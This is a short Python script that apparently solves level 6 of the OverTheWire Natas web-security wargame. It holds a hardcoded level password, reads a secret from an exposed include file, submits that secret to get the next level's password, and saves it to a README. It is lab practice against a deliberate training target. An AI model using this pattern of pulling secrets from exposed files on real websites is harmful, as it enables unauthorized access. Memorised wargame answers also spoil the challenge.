#!/usr/bin/python3
import re
import requests

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = 'http://%s.natas.labs.overthewire.org/'%(username)
auth = (username, password)


response = requests.get(url, auth=auth)
print(response.text)



secret_url = url + 'includes/secret.inc'
#print(secret_url)
response = requests.get(secret_url, auth=auth)
#print(response.text)
secret = re.findall('secret = "(.*)"', response.text)[0]
#print(secret)
payload = {'secret' : secret, 'submit' : 'Submit'}
print(payload)

response = requests.post(url, auth=auth, data=payload)
print(response.text)

next_password = (re.findall("natas7 is (.*)",response.text))[0]

print(next_password)

'''
Automatically add new password to README.md if it's not already there.
I'm not sure if I want to use this yet...but it was a fun little problem to solve
'''

natas = []
flag = False
r = re.compile("natas7.*")
with open('README.md','r') as file:
    for line in file:
        type(line) 
        if '## Passwords' in line:
            flag = True 
        elif flag == True:
            natas.append(line)
file.close()
if not list(filter(r.match, natas)):
    file = open('README.md','a+')
    file.write('\n\nnatas7 | %s' % next_password)
    file.close()
